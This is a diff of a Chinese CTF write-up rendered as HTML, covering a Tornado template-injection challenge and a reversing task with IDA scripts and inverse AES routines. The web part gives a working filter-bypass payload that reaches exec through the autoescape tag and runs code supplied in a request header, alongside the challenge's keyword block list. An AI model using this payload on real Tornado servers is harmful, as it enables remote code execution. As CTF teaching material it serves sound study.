 <span class="hljs-keyword">import</span> os
 <span class="hljs-keyword">import</span> re
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">filter</span><span class="hljs-params">(data)</span>:</span>
-    data = unicodedata.normalize(<span class="hljs-string">'NFKD'</span>,data)
-    <span class="hljs-keyword">if</span> len(data) &gt; <span class="hljs-number">1024</span>:
-        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
-    <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r'__|\(|\)|datetime|sys|import'</span>,data):
-        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">filter</span>(<span class="hljs-params">data</span>):</span>
+    data = unicodedata.normalize(<span class="hljs-string">&#x27;NFKD&#x27;</span>,data)
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &gt; <span class="hljs-number">1024</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+    <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&#x27;__|\(|\)|datetime|sys|import&#x27;</span>,data):
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
     <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> builtins.__dict__.keys():
         <span class="hljs-keyword">if</span> k <span class="hljs-keyword">in</span> data:
-            <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
-    <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexHandler</span><span class="hljs-params">(tornado.web.RequestHandler)</span>:</span>
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(self)</span>:</span>
-        self.render(<span class="hljs-string">"templates/index.html"</span>,)
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span><span class="hljs-params">(self)</span>:</span>
-        data = self.get_argument(<span class="hljs-string">"data"</span>)
-        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filter(data):
-            self.finish(<span class="hljs-string">"no no no"</span>)
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span>
+        self.render(<span class="hljs-string">&quot;templates/index.html&quot;</span>,)
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span>(<span class="hljs-params">self</span>):</span>
+        data = self.get_argument(<span class="hljs-string">&quot;data&quot;</span>)
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">filter</span>(data):
+            self.finish(<span class="hljs-string">&quot;no no no&quot;</span>)
         <span class="hljs-keyword">else</span>:
-            id = uuid.uuid4()
-            f = open(f<span class="hljs-string">"uploads/{id}.html"</span>,<span class="hljs-string">'w'</span>)
+            <span class="hljs-built_in">id</span> = uuid.uuid4()
+            f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;uploads/<span class="hljs-subst">{<span class="hljs-built_in">id</span>}</span>.html&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)
             f.write(data)
             f.close()
             <span class="hljs-keyword">try</span>:
-                self.render(f<span class="hljs-string">"uploads/{id}.html"</span>,)
+                self.render(<span class="hljs-string">f&quot;uploads/<span class="hljs-subst">{<span class="hljs-built_in">id</span>}</span>.html&quot;</span>,)
             <span class="hljs-keyword">except</span>:
-                self.finish(<span class="hljs-string">"error"</span>)
-            os.unlink(f<span class="hljs-string">"uploads/{id}.html"</span>)
+                self.finish(<span class="hljs-string">&quot;error&quot;</span>)
+            os.unlink(<span class="hljs-string">f&quot;uploads/<span class="hljs-subst">{<span class="hljs-built_in">id</span>}</span>.html&quot;</span>)
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_app</span><span class="hljs-params">()</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_app</span>():</span>
     <span class="hljs-keyword">return</span> tornado.web.Application([
-        (<span class="hljs-string">r"/"</span>, IndexHandler),
-    ],compiled_template_cache=<span class="hljs-keyword">False</span>)
+        (<span class="hljs-string">r&quot;/&quot;</span>, IndexHandler),
+    ],compiled_template_cache=<span class="hljs-literal">False</span>)
 
-<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
     app = make_app()
     app.listen(<span class="hljs-number">8888</span>)
     tornado.ioloop.IOLoop.current().start()</code></pre><ul class="list">
@@ -623,28 +623,28 @@ local=<span class="hljs-number">0</span>
 </ul>
 <p>要想寻找其他执行代码的方法，先来读一下文档，看看除了 import 还有没有什么特殊的 tag：<a href="https://www.tornadoweb.org/en/stable/template.html#syntax-reference">https://www.tornadoweb.org/en/stable/template.html#syntax-reference</a></p>
 <p>其中 raw 和 autoescape 比较特别，前者可以返回 python 代码的执行结果，后者接收一个函数，用来对当前文件里所有 block 的输出进行编码。在 <code>tornado/template.py</code> 里可以看到它的实现：</p>
-<pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_Expression</span><span class="hljs-params">(_Node)</span>:</span>
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, expression: str, line: int, raw: bool = False)</span> -&gt; <span class="hljs-keyword">None</span>:</span>
+<pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_Expression</span>(<span class="hljs-params">_Node</span>):</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, expression: <span class="hljs-built_in">str</span>, line: <span class="hljs-built_in">int</span>, raw: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span></span>) -&gt; <span class="hljs-literal">None</span>:</span>
         self.expression = expression
         self.line = line
         self.raw = raw
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate</span><span class="hljs-params">(self, writer: <span class="hljs-string">"_CodeWriter"</span>)</span> -&gt; <span class="hljs-keyword">None</span>:</span>
-        writer.write_line(<span class="hljs-string">"_tt_tmp = %s"</span> % self.expression, self.line) <span class="hljs-comment"># ⚠vulnerable</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate</span>(<span class="hljs-params">self, writer: <span class="hljs-string">&quot;_CodeWriter&quot;</span></span>) -&gt; <span class="hljs-literal">None</span>:</span>
+        writer.write_line(<span class="hljs-string">&quot;_tt_tmp = %s&quot;</span> % self.expression, self.line) <span class="hljs-comment"># ⚠vulnerable</span>
         writer.write_line(
-            <span class="hljs-string">"if isinstance(_tt_tmp, _tt_string_types):"</span> <span class="hljs-string">" _tt_tmp = _tt_utf8(_tt_tmp)"</span>,
+            <span class="hljs-string">&quot;if isinstance(_tt_tmp, _tt_string_types):&quot;</span> <span class="hljs-string">&quot; _tt_tmp = _tt_utf8(_tt_tmp)&quot;</span>,
             self.line,
         )
-        writer.write_line(<span class="hljs-string">"else: _tt_tmp = _tt_utf8(str(_tt_tmp))"</span>, self.line)
-        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.raw <span class="hljs-keyword">and</span> writer.current_template.autoescape <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>:
+        writer.write_line(<span class="hljs-string">&quot;else: _tt_tmp = _tt_utf8(str(_tt_tmp))&quot;</span>, self.line)
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.raw <span class="hljs-keyword">and</span> writer.current_template.autoescape <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
             <span class="hljs-comment"># In python3 functions like xhtml_escape return unicode,</span>
             <span class="hljs-comment"># so we have to convert to utf8 again.</span>
             writer.write_line(
-                <span class="hljs-string">"_tt_tmp = _tt_utf8(%s(_tt_tmp))"</span> % writer.current_template.autoescape, <span class="hljs-comment"># ⚠vulnerable</span>
+                <span class="hljs-string">&quot;_tt_tmp = _tt_utf8(%s(_tt_tmp))&quot;</span> % writer.current_template.autoescape, <span class="hljs-comment"># ⚠vulnerable</span>
                 self.line,
             )
-        writer.write_line(<span class="hljs-string">"_tt_append(_tt_tmp)"</span>, self.line)</code></pre><p>可以看到 raw 和 autoescape 都是直接把参数拼接到代码里执行。如果我们能在代码运行的context里找到类似 eval 或者 os 这些 function或者说module, 就能通过类似
- <code>{% autoescape xx.yy.zz.eval %} {{ &#39;print(1)&#39; }}</code></p>
+        writer.write_line(<span class="hljs-string">&quot;_tt_append(_tt_tmp)&quot;</span>, self.line)</code></pre><p>可以看到 raw 和 autoescape 都是直接把参数拼接到代码里执行。如果我们能在代码运行的context里找到类似 eval 或者 os 这些 function或者说module, 就能通过类似
+ <code>{% autoescape xx.yy.zz.eval %} {{ &#39;print(1)&#39; }} </code></p>
 <p>这样的方法来RCE，这相当于 <code>eval(&#39;print(1)&#39;)</code>。</p>
 <p>怎么在context找这些函数呢，只需要在app.py的 render() 下个断点，一步一步跟,template.py拼接这些 <code>_tt_xxxxx</code> 的python代码之后总会要通过exec执行一下</p>
 <p>比如327行这里self.code就是编译模板要执行的代码：</p>
@@ -652,8 +652,8 @@ local=<span class="hljs-number">0</span>
 <p>362行的 execute() 就是执行代码的地方，此时step into一次然后切到debugger的console就有对应的上下文了</p>
 <p class="img-container"><img src="https://i.imgur.com/P9Gwde7.png" alt=""></p>
 <p>最终我找到了 exec：</p>
-<pre class="hljs"><code>{% autoescape request.server_connection._serving_future._coro.cr_frame.f_builtins['exe'+'c'] %}
-{{ request.headers[<span class="hljs-string">"z"</span>] }}
+<pre class="hljs"><code>{% autoescape request.server_connection._serving_future._coro.cr_frame.f_builtins[&#x27;exe&#x27;+&#x27;c&#x27;] %}
+{{ request.headers[<span class="hljs-string">&quot;z&quot;</span>] }}
 </code></pre><p>把要执行的python代码放在request header里就行了:</p>
 <p class="img-container"><img src="https://i.imgur.com/sfoBfjG.png" alt=""></p>
 <h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse</h2>
@@ -669,23 +669,23 @@ local=<span class="hljs-number">0</span>
 <span class="hljs-keyword">import</span> ida_bytes
 <span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *
 
-keyreg=<span class="hljs-string">'xmm0'</span>
-g_fp=open(<span class="hljs-string">'flow.txt'</span>,<span class="hljs-string">'w+'</span>)
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myexit</span><span class="hljs-params">()</span>:</span>
+keyreg=<span class="hljs-string">&#x27;xmm0&#x27;</span>
+g_fp=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flow.txt&#x27;</span>,<span class="hljs-string">&#x27;w+&#x27;</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myexit</span>():</span>
     g_fp.close()
     exit()
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">log_code</span><span class="hljs-params">(code)</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">log_code</span>(<span class="hljs-params">code</span>):</span>
     <span class="hljs-keyword">global</span> g_fp
-    g_fp.write(code+<span class="hljs-string">'\n'</span>)
-    print(code)
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cvt_xmmi</span><span class="hljs-params">(s)</span>:</span>
-    a=<span class="hljs-string">""</span>
+    g_fp.write(code+<span class="hljs-string">&#x27;\n&#x27;</span>)
+    <span class="hljs-built_in">print</span>(code)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cvt_xmmi</span>(<span class="hljs-params">s</span>):</span>
+    a=<span class="hljs-string">&quot;&quot;</span>
     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:
-        a+=<span class="hljs-string">'\\x'</span>+hex(i)[<span class="hljs-number">2</span>:]
-    <span class="hljs-keyword">return</span> <span class="hljs-string">'b2m(\"'</span>+a+<span class="hljs-string">'\")'</span>
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_opxmmi</span><span class="hljs-params">(ip)</span>:</span>
+        a+=<span class="hljs-string">&#x27;\\x&#x27;</span>+<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:]
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;b2m(\&quot;&#x27;</span>+a+<span class="hljs-string">&#x27;\&quot;)&#x27;</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_opxmmi</span>(<span class="hljs-params">ip</span>):</span>
     <span class="hljs-keyword">global</span> keyreg
-    opreg=<span class="hljs-string">''</span>
+    opreg=<span class="hljs-string">&#x27;&#x27;</span>
     val_idx=<span class="hljs-number">0</span>
     <span class="hljs-keyword">if</span> print_operand(ip,<span class="hljs-number">1</span>)==keyreg:
         opreg=print_operand(ip,<span class="hljs-number">2</span>)
@@ -695,140 +695,140 @@ g_fp=open(<span class="hljs-string">'flow.txt'</span>,<span class="hljs-string">
             myexit()
         opreg=print_operand(ip,<span class="hljs-number">1</span>)
         val_idx=<span class="hljs-number">1</span>
-    <span class="hljs-keyword">if</span> opreg.find(<span class="hljs-string">'rbp'</span>)!=<span class="hljs-number">-1</span>:
+    <span class="hljs-keyword">if</span> opreg.find(<span class="hljs-string">&#x27;rbp&#x27;</span>)!=-<span class="hljs-number">1</span>:
         rbp_off=get_operand_value(ip,val_idx)
-        rbp_off=struct.unpack(<span class="hljs-string">'q'</span>,struct.pack(<span class="hljs-string">'Q'</span>,rbp_off))[<span class="hljs-number">0</span>]
-        rbp=ida_dbg.get_reg_val(<span class="hljs-string">'rbp'</span>)
+        rbp_off=struct.unpack(<span class="hljs-string">&#x27;q&#x27;</span>,struct.pack(<span class="hljs-string">&#x27;Q&#x27;</span>,rbp_off))[<span class="hljs-number">0</span>]
+        rbp=ida_dbg.get_reg_val(<span class="hljs-string">&#x27;rbp&#x27;</span>)
         data_pos=rbp+rbp_off
         bdata=ida_bytes.get_bytes(data_pos,<span class="hljs-number">16</span>)
         <span class="hljs-keyword">return</span> cvt_xmmi(bdata)
     <span class="hljs-keyword">else</span>:
         <span class="hljs-keyword">return</span> cvt_xmmi(ida_dbg.get_reg_val(opreg))
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_opxmmi2</span><span class="hljs-params">(ip)</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_opxmmi2</span>(<span class="hljs-params">ip</span>):</span>
     <span class="hljs-keyword">global</span> keyreg
     <span class="hljs-keyword">if</span> print_operand(ip,<span class="hljs-number">1</span>)!=keyreg:
         myexit()
     opreg=print_operand(ip,<span class="hljs-number">2</span>)
-    <span class="hljs-keyword">if</span> opreg.find(<span class="hljs-string">'rbp'</span>)!=<span class="hljs-number">-1</span>:
+    <span class="hljs-keyword">if</span> opreg.find(<span class="hljs-string">&#x27;rbp&#x27;</span>)!=-<span class="hljs-number">1</span>:
         rbp_off=get_operand_value(ip,<span class="hljs-number">2</span>)
-        rbp_off=struct.unpack(<span class="hljs-string">'q'</span>,struct.pack(<span class="hljs-string">'Q'</span>,rbp_off))[<span class="hljs-number">0</span>]
-        rbp=ida_dbg.get_reg_val(<span class="hljs-string">'rbp'</span>)
+        rbp_off=struct.unpack(<span class="hljs-string">&#x27;q&#x27;</span>,struct.pack(<span class="hljs-string">&#x27;Q&#x27;</span>,rbp_off))[<span class="hljs-number">0</span>]
+        rbp=ida_dbg.get_reg_val(<span class="hljs-string">&#x27;rbp&#x27;</span>)
         data_pos=rbp+rbp_off
         bdata=ida_bytes.get_bytes(data_pos,<span class="hljs-number">16</span>)
         <span class="hljs-keyword">return</span> cvt_xmmi(bdata)
     <span class="hljs-keyword">else</span>:
         <span class="hljs-keyword">return</span> cvt_xmmi(ida_dbg.get_reg_val(opreg))
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vpxor</span><span class="hljs-params">(ip)</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vpxor</span>(<span class="hljs-params">ip</span>):</span>
     xmmi=prase_opxmmi(ip)
-    log_code(<span class="hljs-string">'dst=xorq(dst,'</span>+xmmi+<span class="hljs-string">');'</span>)
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vpaddq</span><span class="hljs-params">(ip)</span>:</span>
+    log_code(<span class="hljs-string">&#x27;dst=xorq(dst,&#x27;</span>+xmmi+<span class="hljs-string">&#x27;);&#x27;</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vpaddq</span>(<span class="hljs-params">ip</span>):</span>
     xmmi=prase_opxmmi(ip)
-    log_code(<span class="hljs-string">'dst=addq(dst,'</span>+xmmi+<span class="hljs-string">');'</span>)
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vpsubq</span><span class="hljs-params">(ip)</span>:</span>
+    log_code(<span class="hljs-string">&#x27;dst=addq(dst,&#x27;</span>+xmmi+<span class="hljs-string">&#x27;);&#x27;</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vpsubq</span>(<span class="hljs-params">ip</span>):</span>
     <span class="hljs-keyword">global</span> keyreg
     xmmi=prase_opxmmi(ip)
     <span class="hljs-keyword">if</span> print_operand(ip,<span class="hljs-number">1</span>)!=keyreg:
         myexit()
     <span class="hljs-keyword">else</span>:
-        log_code(<span class="hljs-string">'dst=subq(dst,'</span>+xmmi+<span class="hljs-string">');'</span>)
+        log_code(<span class="hljs-string">&#x27;dst=subq(dst,&#x27;</span>+xmmi+<span class="hljs-string">&#x27;);&#x27;</span>)
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vaesenc</span><span class="hljs-params">(ip)</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vaesenc</span>(<span class="hljs-params">ip</span>):</span>
     xmmi=prase_opxmmi2(ip)
-    log_code(<span class="hljs-string">'dst=aesenc(dst,'</span>+xmmi+<span class="hljs-string">');'</span>)
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vaesenclast</span><span class="hljs-params">(ip)</span>:</span>
+    log_code(<span class="hljs-string">&#x27;dst=aesenc(dst,&#x27;</span>+xmmi+<span class="hljs-string">&#x27;);&#x27;</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vaesenclast</span>(<span class="hljs-params">ip</span>):</span>
     xmmi=prase_opxmmi2(ip)
-    log_code(<span class="hljs-string">'dst=aesenclast(dst,'</span>+xmmi+<span class="hljs-string">');'</span>)
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vaesdec</span><span class="hljs-params">(ip)</span>:</span>
+    log_code(<span class="hljs-string">&#x27;dst=aesenclast(dst,&#x27;</span>+xmmi+<span class="hljs-string">&#x27;);&#x27;</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vaesdec</span>(<span class="hljs-params">ip</span>):</span>
     xmmi=prase_opxmmi2(ip)
-    log_code(<span class="hljs-string">'dst=aesdec(dst,'</span>+xmmi+<span class="hljs-string">');'</span>)
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vaesdeclast</span><span class="hljs-params">(ip)</span>:</span>
+    log_code(<span class="hljs-string">&#x27;dst=aesdec(dst,&#x27;</span>+xmmi+<span class="hljs-string">&#x27;);&#x27;</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vaesdeclast</span>(<span class="hljs-params">ip</span>):</span>
     xmmi=prase_opxmmi2(ip)
-    log_code(<span class="hljs-string">'dst=aesdeclast(dst,'</span>+xmmi+<span class="hljs-string">');'</span>)
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vpshufd</span><span class="hljs-params">(ip)</span>:</span>
-    _ord=hex(get_operand_value(ip,<span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:]
-    log_code(<span class="hljs-string">'dst=pshufd(dst,0x'</span>+_ord+<span class="hljs-string">');'</span>)
-<span class="hljs-keyword">while</span>(<span class="hljs-keyword">True</span>):
+    log_code(<span class="hljs-string">&#x27;dst=aesdeclast(dst,&#x27;</span>+xmmi+<span class="hljs-string">&#x27;);&#x27;</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prase_vpshufd</span>(<span class="hljs-params">ip</span>):</span>
+    _<span class="hljs-built_in">ord</span>=<span class="hljs-built_in">hex</span>(get_operand_value(ip,<span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:]
+    log_code(<span class="hljs-string">&#x27;dst=pshufd(dst,0x&#x27;</span>+_<span class="hljs-built_in">ord</span>+<span class="hljs-string">&#x27;);&#x27;</span>)
+<span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):
     <span class="hljs-keyword">if</span> ip == <span class="hljs-number">0x7FF6C0AD88FA</span>:
             myexit()
-    ip=ida_dbg.get_reg_val(<span class="hljs-string">"rip"</span>)
+    ip=ida_dbg.get_reg_val(<span class="hljs-string">&quot;rip&quot;</span>)
     <span class="hljs-comment">#print(hex(ip)[2:])</span>
     dis=GetDisasm(ip)
     mnem=print_insn_mnem(ip)
     <span class="hljs-keyword">if</span> print_operand(ip,<span class="hljs-number">0</span>)==keyreg:
-        <span class="hljs-keyword">if</span> mnem == <span class="hljs-string">'vmovdqa'</span>:
+        <span class="hljs-keyword">if</span> mnem == <span class="hljs-string">&#x27;vmovdqa&#x27;</span>:
             <span class="hljs-keyword">break</span>
-        <span class="hljs-keyword">if</span> mnem == <span class="hljs-string">'vpxor'</span>:
+        <span class="hljs-keyword">if</span> mnem == <span class="hljs-string">&#x27;vpxor&#x27;</span>:
             prase_vpxor(ip)
-        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vpshufd'</span>:
+        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">&#x27;vpshufd&#x27;</span>:
             prase_vpshufd(ip)
-        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vpaddq'</span>:
+        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">&#x27;vpaddq&#x27;</span>:
             prase_vpaddq(ip)
-        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vpsubq'</span>:
+        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">&#x27;vpsubq&#x27;</span>:
             prase_vpsubq(ip)
-        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vaesenc'</span>:
+        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">&#x27;vaesenc&#x27;</span>:
             prase_vaesenc(ip)
-        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vaesenclast'</span>:
+        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">&#x27;vaesenclast&#x27;</span>:
             prase_vaesenclast(ip)
-        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vaesdec'</span>:
+        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">&#x27;vaesdec&#x27;</span>:
             prase_vaesdec(ip)
-        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vaesdeclast'</span>:
+        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">&#x27;vaesdeclast&#x27;</span>:
             prase_vaesdeclast(ip)
-        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">'vaesimc'</span>:
+        <span class="hljs-keyword">elif</span> mnem == <span class="hljs-string">&#x27;vaesimc&#x27;</span>:
             <span class="hljs-keyword">break</span>
         <span class="hljs-keyword">else</span>:
             <span class="hljs-keyword">break</span>
-
+        
     ida_dbg.step_over()
     ida_dbg.wait_for_next_event(ida_dbg.WFNE_SUSP,<span class="hljs-number">2</span>)</code></pre><p>这个脚本可以dump出原先的控制流逻辑,遇到把keyreg赋值的指令就停止,keyreg可能是xmm0或者xmm4</p>
 <p>然后用该脚本将整个控制流翻转</p>
-<pre class="hljs"><code>fp=open(<span class="hljs-string">'newflow.txt'</span>,<span class="hljs-string">'r'</span>)
+<pre class="hljs"><code>fp=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newflow.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)
 flow_array=[]
 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fp:
     flow_array.append(i)
 
-print(len(flow_array))
-alls=<span class="hljs-string">''</span>
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(flow_array)):
-    line=flow_array[len(flow_array)-i<span class="hljs-number">-1</span>]
-    newline=line[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]+<span class="hljs-string">'re_'</span>+line[<span class="hljs-number">6</span>:]
+<span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(flow_array))
+alls=<span class="hljs-string">&#x27;&#x27;</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(flow_array)):
+    line=flow_array[<span class="hljs-built_in">len</span>(flow_array)-i-<span class="hljs-number">1</span>]
+    newline=line[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]+<span class="hljs-string">&#x27;re_&#x27;</span>+line[<span class="hljs-number">6</span>:]
     alls+=newline
 
 fp.close();
-fp=open(<span class="hljs-string">'rev_flow.txt'</span>,<span class="hljs-string">'w+'</span>)
+fp=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rev_flow.txt&#x27;</span>,<span class="hljs-string">&#x27;w+&#x27;</span>)
 
 fp.write(alls)
 fp.close()</code></pre><p>相关逆运算</p>
-<pre class="hljs"><code>__<span class="hljs-function">m128i <span class="hljs-title">re_aesenc</span><span class="hljs-params">(__m128i v, __m128i k)</span> </span>{
-    AddRoundKey(&amp;v, &amp;k);
-    MixColumnsRe(&amp;v);
-    SubBytesRe(&amp;v, &amp;v, <span class="hljs-number">16</span>);
-    ShiftRowsRe(&amp;v);
+<pre class="hljs"><code><span class="hljs-function">__m128i <span class="hljs-title">re_aesenc</span><span class="hljs-params">(__m128i v, __m128i k)</span> </span>{
+    <span class="hljs-built_in">AddRoundKey</span>(&amp;v, &amp;k);
+    <span class="hljs-built_in">MixColumnsRe</span>(&amp;v);
+    <span class="hljs-built_in">SubBytesRe</span>(&amp;v, &amp;v, <span class="hljs-number">16</span>);
+    <span class="hljs-built_in">ShiftRowsRe</span>(&amp;v);
     <span class="hljs-keyword">return</span> v;
 }
-__<span class="hljs-function">m128i <span class="hljs-title">re_aesdec</span><span class="hljs-params">(__m128i v, __m128i k)</span> </span>{
-    AddRoundKey(&amp;v, &amp;k);
-    MixColumns(&amp;v);
-    SubBytes(&amp;v, &amp;v, <span class="hljs-number">16</span>);
-    ShiftRows(&amp;v);
+<span class="hljs-function">__m128i <span class="hljs-title">re_aesdec</span><span class="hljs-params">(__m128i v, __m128i k)</span> </span>{
+    <span class="hljs-built_in">AddRoundKey</span>(&amp;v, &amp;k);
+    <span class="hljs-built_in">MixColumns</span>(&amp;v);
+    <span class="hljs-built_in">SubBytes</span>(&amp;v, &amp;v, <span class="hljs-number">16</span>);
+    <span class="hljs-built_in">ShiftRows</span>(&amp;v);
     <span class="hljs-keyword">return</span> v;
 }
-__<span class="hljs-function">m128i <span class="hljs-title">re_aesenclast</span><span class="hljs-params">(__m128i v, __m128i k)</span> </span>{
-    AddRoundKey(&amp;v, &amp;k);
-    SubBytesRe(&amp;v, &amp;v, <span class="hljs-number">16</span>);
-    ShiftRowsRe(&amp;v);
+<span class="hljs-function">__m128i <span class="hljs-title">re_aesenclast</span><span class="hljs-params">(__m128i v, __m128i k)</span> </span>{
+    <span class="hljs-built_in">AddRoundKey</span>(&amp;v, &amp;k);
+    <span class="hljs-built_in">SubBytesRe</span>(&amp;v, &amp;v, <span class="hljs-number">16</span>);
+    <span class="hljs-built_in">ShiftRowsRe</span>(&amp;v);
     <span class="hljs-keyword">return</span> v;
 }
-__<span class="hljs-function">m128i <span class="hljs-title">re_aesdeclast</span><span class="hljs-params">(__m128i v, __m128i k)</span> </span>{
-    AddRoundKey(&amp;v, &amp;k);
-    SubBytes(&amp;v, &amp;v, <span class="hljs-number">16</span>);
-    ShiftRows(&amp;v);
+<span class="hljs-function">__m128i <span class="hljs-title">re_aesdeclast</span><span class="hljs-params">(__m128i v, __m128i k)</span> </span>{
+    <span class="hljs-built_in">AddRoundKey</span>(&amp;v, &amp;k);
+    <span class="hljs-built_in">SubBytes</span>(&amp;v, &amp;v, <span class="hljs-number">16</span>);
+    <span class="hljs-built_in">ShiftRows</span>(&amp;v);
     <span class="hljs-keyword">return</span> v;
 }
-__<span class="hljs-function">m128i <span class="hljs-title">re_aesimc</span><span class="hljs-params">(__m128i v)</span> </span>{
-    MixColumns(&amp;v);
+<span class="hljs-function">__m128i <span class="hljs-title">re_aesimc</span><span class="hljs-params">(__m128i v)</span> </span>{
+    <span class="hljs-built_in">MixColumns</span>(&amp;v);
     <span class="hljs-keyword">return</span> v;
 }
